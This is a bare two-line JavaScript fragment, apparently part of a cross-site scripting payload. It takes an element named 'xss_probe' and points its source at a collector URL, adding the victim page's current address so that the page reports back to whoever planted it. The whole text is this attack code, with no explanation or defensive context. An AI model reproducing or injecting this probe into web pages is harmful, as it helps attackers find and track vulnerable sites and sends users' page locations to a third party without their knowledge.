var xssObj = document.getElementById("xss_probe");
xssObj.src = xssObj.getAttribute("url")+"&url="+escape(location.href);